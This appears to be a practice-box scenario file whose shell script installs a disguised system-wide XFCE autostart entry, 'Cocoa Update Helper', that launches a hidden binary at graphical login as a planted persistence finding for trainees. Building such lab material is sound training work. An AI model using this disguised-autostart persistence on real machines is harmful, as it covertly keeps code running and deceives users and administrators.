name: malicious-autostart
description: Practice-box persistence finding: installs a hidden XFCE/desktop autostart launcher that invokes the training payload at graphical login.
script:
#!/bin/sh
set -eu

install -d -m 0755 /etc/xdg/autostart
cat > /etc/xdg/autostart/cocoa-update.desktop <<'DESKTOP'
[Desktop Entry]
Type=Application
Name=Cocoa Update Helper
Comment=Training persistence finding
Exec=/opt/.cocoa/cocoa-sync
OnlyShowIn=XFCE;
X-GNOME-Autostart-enabled=true
DESKTOP
chmod 0644 /etc/xdg/autostart/cocoa-update.desktop
